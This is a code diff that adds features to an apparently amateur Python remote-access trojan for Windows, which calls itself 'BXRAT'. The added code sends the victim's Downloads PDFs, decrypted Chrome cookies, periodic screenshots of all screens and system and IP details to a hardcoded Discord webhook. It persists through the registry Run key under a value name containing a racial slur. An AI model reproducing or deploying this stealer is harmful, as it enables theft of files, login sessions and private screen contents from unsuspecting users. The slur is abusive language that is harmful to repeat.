@@ -7,33 +7,82 @@ import os
 import winreg
 import platform
 import socket
+import json
+import win32crypt
+import sqlite3
 
 
-webhook_url = "Bro you know what i mean"
+webhook_url = "https://discord.com/api/webhooks/1079350643413762062/PFhXhfER5tw1FvmEKmR2ns38a1g4ViXDQTCOCjTxS35gdFTWxcXG1rfQTj6RTsIBbVbf"
+
+
+
+
+def send_pdfs_to_webhook(directory_path):
+    files = os.listdir(directory_path)
+    pdf_files = [f for f in files if f.endswith(".pdf")]
+    for pdf_file in pdf_files:
+        with open(os.path.join(directory_path, pdf_file), "rb") as f:
+            file_content = f.read()
+        payload = {
+            "file": (pdf_file, file_content, "application/pdf")
+        }
+        response = requests.post(webhook_url, files=payload)
+        if response.status_code != 200:
+            print(f"Failed to post {pdf_file} to Discord webhook")
+
+def send_pdfs_periodically():
+    directory_path = "C:/Users/User/Downloads"
+    send_pdfs_to_webhook(directory_path)
+    threading.Timer(100.0, send_pdfs_periodically).start()
+
+send_pdfs_periodically()
+
+
+
+
+
+def get_chrome_cookies():
+    cookies_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Cookies")
+    conn = sqlite3.connect(cookies_path)
+    cursor = conn.cursor()
+    cursor.execute('SELECT name, value, host_key FROM cookies')
+    cookies = cursor.fetchall()
+    cursor.close()
+    conn.close()
+    result = []
+    for name, value, host_key in cookies:
+        encrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1]
+        cookie = {"name": name, "value": encrypted_value.decode(), "host_key": host_key}
+        result.append(cookie)
+    return result
+
+def post_cookies_to_webhook():
+    cookies = get_chrome_cookies()
+    payload = {"content": "Chrome Cookies", "embeds": [{"title": "Cookies", "description": json.dumps(cookies)}]}
+    response = requests.post(webhook_url, json=payload)
+    if response.status_code != 200:
+        print("Failed to post cookies to Discord webhook")
+threading.Timer(60.0, post_cookies_to_webhook).start()
+
+
+
+
 
 def post_screenshot():
-    screenshot = ImageGrab.grab()
-
-
+    screenshot = ImageGrab.grab(all_screens=True)
     img_bytes = io.BytesIO()
     screenshot.save(img_bytes, format='PNG')
     img_bytes = img_bytes.getvalue()
-
-
     payload = {
         "file": ("screenshot.png", img_bytes, "image/png")
     }
-
-    # Post payload to Discord webhook
     response = requests.post(webhook_url, files=payload)
-
-
-
     if response.status_code != 200:
         print("Failed to post screenshot to Discord webhook")
+    threading.Timer(3600.0, post_screenshot).start()
 
-    # Schedule next screenshot
-    threading.Timer(10.0, post_screenshot).start()
+
+
 
 
 def post_system_info():
@@ -50,31 +99,23 @@ def post_system_info():
             {
                 "title": "IP Address",
                 "description": ip_address,
-                "color": 3066993
+                "color": 15158332
             }
         ]
     }
-
-    # Post payload to Discord webhook
     response = requests.post(webhook_url, json=payload)
-
-    # Check response status code
     if response.status_code != 200:
-        print("Failed to post system info to Discord webhook")
+        print("Rat Injected!")
 
 
 def register_startup():
     script_path = os.path.abspath(__file__)
-
-    # Open Windows registry key for startup programs
     startup_key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER,
         r"Software\Microsoft\Windows\CurrentVersion\Run",
         0,
         winreg.KEY_WRITE
     )
-
-
     winreg.SetValueEx(
         startup_key,
         "IFYOUSEETHSIITSTOLATENIGGER",
@@ -82,14 +123,17 @@ def register_startup():
         winreg.REG_SZ,
         script_path
     )
-
     winreg.CloseKey(startup_key)
-    print("Script registered as a startup program")
+    print("BXRAT - V1.2")
+
+
+
 
 
 register_startup()
 post_system_info()
 threading.Timer(10.0, post_screenshot).start()
+
 
 
 while True:
